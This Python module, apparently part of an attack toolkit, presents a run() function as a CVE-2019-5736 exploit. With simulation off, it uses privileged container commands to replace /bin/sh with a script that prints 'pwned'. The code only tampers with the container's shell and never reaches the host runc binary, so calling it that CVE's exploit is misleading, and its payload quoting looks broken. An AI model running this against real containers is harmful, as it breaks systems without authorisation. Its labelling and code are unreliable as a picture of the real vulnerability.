# Path: attacks/cve_2019_5736.py

def run(container, simulate=False):
    print("[*] Running CVE-2019-5736 exploit...")

    if simulate:
        # Simulated execution: just logs the intended overwrite
        print(f"[SIMULATE] Would attempt to overwrite /bin/sh in container '{container.name}'")
        print("[SIMULATE] Result would be replacing it with a shell that echoes 'pwned'")
        return "Simulated run: No changes made."

    try:
        # ⚠️ REAL PAYLOAD EXECUTION (simulate=False)
        # This replaces /bin/sh in the container with a custom shell that echoes "pwned"
        payload = '#!/bin/bash\necho "pwned"'
        container.exec_run("echo '{}' > /tmp/pwned_shell.sh".format(payload), privileged=True)
        container.exec_run("chmod +x /tmp/pwned_shell.sh", privileged=True)
        container.exec_run("ln -sf /tmp/pwned_shell.sh /bin/sh", privileged=True)

        print("[+] Exploit payload delivered. /bin/sh now points to /tmp/pwned_shell.sh")
        return "Executed: /bin/sh replaced with pwned shell"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
